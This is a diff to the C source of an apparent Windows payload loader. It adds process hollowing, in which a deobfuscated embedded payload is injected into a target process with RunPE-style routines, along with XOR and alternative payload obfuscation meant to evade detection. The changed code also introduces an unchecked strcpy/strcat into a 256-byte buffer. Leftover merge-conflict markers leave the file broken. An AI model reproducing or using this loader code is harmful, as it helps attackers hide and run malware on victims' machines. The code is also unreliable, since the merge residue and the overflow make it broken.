@@ -26,7 +26,10 @@ Web: https://github.com/govolution/bfg
 #include <winternl.h>
 #include "defs.h"
 #ifdef IMAGE
-#include <psapi.h>
+	#include <psapi.h>
+#endif
+#ifdef PROCESS_HOLLOWING
+	#include "include/hollow.h"
 #endif
 
 int get_filesize(char *fvalue);
@@ -164,27 +167,38 @@ int main (int argc, char **argv)
 	
 	#ifdef PROCESS_HOLLOWING
 		#ifdef XOR_OBFUSCATION
-			// Decrypt payload
-			// (payloadSize, keyByte and payload specified in defs.h by make_bfg)
-			for(long i=0; i < payloadSize; i++)
-			{
-				payload[i] = payload[i] ^ keyByte;
-			}	
+			// Deobfuscate payload
+			// (payloadSize, keyByte0 and payload specified in defs.h by make_bfg)
+			// deobfuscate() defined in hollow.h
+			deobfuscate(payload, payloadSize, keyByte0);			
+		#endif
+	
+		#ifdef ALT_OBFUSCATION
+			// Alternative, more complex deobfuscation of payload
+			// (payloadSize, keyByte0, keyByte1 and payload specified in defs.h by make_bfg)
+			// altDeobfuscate() defined in hollow.h
+			altDeobfuscate(payload, payloadSize, keyByte0, keyByte1);
 		#endif
 	
 		// Instanciate target process
 		// Target process specified in first bfg argument argv[1]	
 		// Command line arguments for payload in second bfg argument argv[2]
-		if(!argv[2]) 
-		{
-			// Handle empty command line arguments for payload executable
-			// Relevant if user does not specify "" as second bfg argument
-			newRunPE(argv[1], payload, "");
-		} else
-		{
-			// Instanciate and pass command line arguments
-			newRunPE(argv[1], payload, argv[2]);
+		char commandLine [256];
+		strcpy(commandLine, argv[1]);
+	
+		// Handle empty command line arguments for payload executable
+		// Relevant if user does not specify "" as second bfg argument
+		if(argv[2]) {
+			strcat(commandLine, " ");
+			strcat(commandLine, argv[2]);
 		}	
+			
+		// Instanciate target and pass command line arguments
+		#ifdef X64
+			newRunPE64(argv[1], payload, commandLine);	
+		#else
+			newRunPE32(argv[1], payload, commandLine);
+		#endif	
 	#endif
 
 	#ifdef LOADEXEC_DLL
@@ -372,6 +386,7 @@ DWORD get_pid_by_name(char *imgname)
 
 	return -2;
 }
+<<<<<<< HEAD
 #endif
 
 #ifdef INJECT_DLL
@@ -607,3 +622,6 @@ void newRunPE(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
 }
 #endif
 
+=======
+#endif
+>>>>>>> new-encoding
